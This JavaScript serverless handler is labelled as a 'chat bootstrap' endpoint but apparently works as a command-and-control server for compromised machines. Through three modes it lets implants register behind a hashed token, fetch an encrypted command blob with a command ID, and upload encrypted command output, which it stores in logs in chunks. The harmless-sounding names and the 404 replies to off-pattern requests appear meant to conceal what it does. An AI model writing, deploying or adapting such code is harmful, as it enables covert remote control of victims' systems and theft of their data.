import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '22';
const CONTROL_PAYLOAD = 'U2FsdGVkX18YImHJOarDpNjX0gFNrBpbz7iNtiMKdYqVHHu3Yk0vfpeIyayTSj4bf+xuWGOaJTyzjDyMyeI19wSufA0SwJ6cqpKMChzLLTSqwJglalcbqN/edM3SN38ic0qqu5fK0Js+d2wiqSqRqGSYp+YeY2QwJdtYWtZYIvxGWXQkWpNPyH01ZzzjQI5dzudNlCZDnTx16CsiZ9q3sriGboG4BGlbaOcJ8tc75is7/IXBCk81Pz/+cmm0h9F/mGU8zK6LAosebZR9eG4ty+v4ym34Oxoc0u5XOa8ajZuSYejJX2QljywpiXU7ebtCcCLtpLXLcbsUGjjNNDBbMawKxKpZEwEfTClsVoucTlL1Thqi83PAp8Aa5Rk6mw45VG7zyzIo3hcYp3p5BWrRSJn9Nw9ZRR5AFgsnK3YJGByXA/3qg6U0kDiSR5NPzfz91QAaEYtLNCXUgLo7Z0doJZr3WxhTUd/zQEj4BMS5LFoJBAVwY0tgAh4UkijJ9dkZ3FRaPdDUDrvR6S2uunw7W6jsNZRwmtZsmBCHibE11wmlHd6YB76yaT/z3bZIur+Efi8U5oFTbioRmBClbqHGimH7i1O3jgW0jC2bfCYagR9qao9NHsU/Npl/AL0qsW9znscRNGmoX26O9Q/1u4wXwk3G6GVTFzotlRWsDR4fC6T4bUsDF88utP8J8JGUIr/F14PP5Yik0APLGMJVK6spzR+GMcLKDfmQr3uhNBjX+tI/QormKvjmkDscSsSCifHxNHdDcLGFEclOh6uBCtDTwfQVMDI5pMaRSW4dedOpdtigdtNSkYmKblZBSPMVqzwGPtDiUC6B6zszY6MSxygoCbwCxr+MPZujHfmBrvdLBPFtzLD4aT0TV+IaOVjbHQlUmsXRLUOSJYvaQfEPHXDMp9Xc2Y6XoOk4AKsytSl3grx9lMGMy9kKVsbtoVAwInL6c4R3BXEaEDOgOOh3qXT4P3h40MBxX0HhWEitkOkuDA08CprcryisS6IHsiYpOl4q5cz5U9WBXxLEsZdgkxFQVawbFAkTvdU0x8WNQa8H19hh+ISjAt4WKMhhT7r8X4iGtAoe2FBH+tB/H/uJ3CudXm5rpeigJL/XXGKgCFraxe65GiVt01NMy1qMczzDCEEveTYyJysh8v1fUmmUh/K4IOEyNAG1qsmPGPNrFdLu4CIdCi1vKG4yx+uvFlOJiw6KcMa4kpvxoZYTfKKxKGaUlvfsnEhEEitdci/OnbghSId37wray0xPDZ/ZvoWBf6SKGEs/jF2C5frtlQeh1ILVHN/k3kz9nGk1qil+Cng4+GP7YqwDbSHVzjfkPgDp5r5ZZfkYpbMFTSHDHxvejQC+9nl62u6HrRwVqmfWxMkbU6VpHlWQUVUWYD0jxCiTDzt7jYGKeCsNnkGlSiWfxtQ/C2qPKBZAm/UTdZVH41oBhn3VkArLw3uXBaWmDL5iXHbQOFb9dvUjgRlVKyYMZSE1dBfgOG1VP0BttOhAPCL6JfYFOSlyGs4nAEOzfKVPtk/jSgzl41qiS+M78sAsLiQGiLiFmbj3XAZ8RlxEzX12ItlNEZOTJvu1WcbCX4VyNG6Ee4X/1zU/XRQlWElWSw5KdLqfj2u0auVj9i578bobGoeufPYgzBmJ66ASyOVirNVA/zOBftLAcgMNNngcHsIq1OjzaifVttKUzZIKD46uwJhCiuY2Ocds+WRCEzeoKAmOECqKqjij1OygbL5/8MPCZvOJVvAWj2o12T+78HJuDsny/cusCLqAUM+j76LXO7gjJZdaSaUDMB4suqNTSC8JRUdrXH05u5cx+QqMjsxMCCiul+6a6Sohuoq4BScLZwGbc2vChVOlnAINOVRLCJRScplk7vX8tdNPArC77OYamOmgFxzBqoiLUcaCjf17rEUNjUF9tO0VX5abAjoWMNP1uKlBs6BhPlaBF6QtOXk7LoraRXtzCAwvMW+XFhrqEmMogJH9ksYgJ4RHCZA7R9uk9i1UhQjauuFPoEXoHmkjfHAoo1AFNjhvKCZCB6UJ939d0gd0nFmnJJIb/DyjrK3t9gN6w62Qb9qj3n5H2c5rffJAHqEMkR+z3iFdWBUPnWjV6DTasnjgE70iJWck3kT2/CGjzx1LjQDTHYacXJIJ6N2znxzYPfRlD0hXlwnadmCpQSLnN1rQvWSuy7EsjEhtgxUjNKkre1yd/fUOKLHvw7a20t2kgTPvqJC7bUuGahMOSYSvtsrge2oO1GL5+PTSXSSaSo9LbOJXE/sG+tNaSz7ZCG0ccV1hwog9HoIvIDBvpHx/vJQgbvqu9hAwm3BQI3eMrW7l7+4ym9NxjBF6HQyQQurmtnCGR+mNTQX4wbP+YuHaES9nNkv3Xou8HQvk0di6l+pks9NIp2+dtHjOepze457ozrC9Md9nNxbbVH7Llcxyx23kGdzXNtrRteSkWowPtKs4zZfJrjhknR/4jpLIToHkZR0gO4k/cFptgvNs35SnwxtJkZsZ1ET9QP33Vq1vJPj9CSDdBdUgnqGiixgAzQ4AD0DFh4Je0MTkw7czIiNsVMBHl9/Ve8feQXbpaTepujTffVH1tPHC1qJM/GP/Aw7pF/M6hgQL0iQ9u6iu';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) {
      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    }
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
